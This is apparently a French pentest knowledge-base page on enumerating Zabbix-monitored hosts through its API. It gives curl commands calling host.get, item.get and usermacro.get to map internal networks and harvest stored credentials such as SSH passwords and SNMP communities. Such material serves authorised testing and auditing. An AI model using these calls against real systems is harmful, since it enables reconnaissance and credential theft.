---
title: "Hôte : l'inventaire des hôtes supervisés par Zabbix"
description: "host.get et la page Hosts listent chaque système supervisé par Zabbix, avec les noms d'hôtes, les interfaces IP et DNS, et les modèles et items attachés. C'est une carte du parc interne, des adresses et services que Zabbix atteint, et les items et macros portent fréquemment les identifiants utilisés pour superviser chaque hôte, faisant de l'inventaire à la fois une reconnaissance et une source d'identifiants."
keywords:
  - zabbix hosts
  - host.get
  - interfaces
  - macros
  - inventory
---

# Hôte

L'inventaire des hôtes supervisés est l'une des divulgations les plus précieuses de Zabbix. `host.get` (et la page Data collection > Hosts) liste chaque système que Zabbix surveille, chacun avec ses interfaces configurées (Agent, SNMP, IPMI, JMX) et leurs adresses IP/DNS, les modèles et items attachés, et les champs d'inventaire de l'hôte. C'est une carte toute faite du parc interne : les hôtes qui comptent suffisamment pour être supervisés, leurs adresses, et à quels services (SNMP, IPMI, agent, base de données) Zabbix se connecte sur chacun. Fait crucial, les items et les macros d'hôte/de modèle contiennent souvent les identifiants que Zabbix utilise pour superviser ces hôtes, de sorte qu'énumérer les hôtes et leurs macros récolte à la fois la carte du réseau et les identifiants pour agir dessus.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# hosts with their interface addresses (the estate map)
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"host.get","params":{"output":["host","name"],"selectInterfaces":["type","ip","dns","port"]},"auth":"'"$TOK"'","id":1}'
# items and macros frequently hold the monitoring credentials
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"item.get","params":{"output":["name","key_"],"search":{"key_":"ssh"}},"auth":"'"$TOK"'","id":1}'
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"usermacro.get","params":{"output":"extend"},"auth":"'"$TOK"'","id":1}'
```

## Notes d'exploitation

- La liste des interfaces cartographie le parc et montre quels services Zabbix atteint par hôte (SNMP, IPMI, agent, JMX), orientant où pivoter et quels identifiants rechercher.
- Les macros ({$SNMP_COMMUNITY}, {$SSH_PASSWORD}, secrets de base de données et d'API) stockées au niveau de l'hôte et du modèle portent régulièrement les véritables identifiants ; `usermacro.get` et le traitement des macros de type secret constituent la récolte d'identifiants, voir [Récolte d'identifiants sur des plateformes similaires](../../librenms-and-observium/credential-harvesting.md) pour le schéma général.
- Les hôtes dotés d'une interface Agent sont candidats aux [commandes distantes d'agent](../code-execution/agent-remote-commands.md) ; les hôtes dotés d'interfaces SNMP/IPMI exposent ces identifiants.
- Nécessite une session authentifiée ; l'inventaire combiné aux macros est souvent le plus gros butin isolé d'une compromission Zabbix, avant même l'exécution de code.

## Références

- [Zabbix API : host.get](https://www.zabbix.com/documentation/current/en/manual/api/reference/host/get)
- [HackTricks : Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
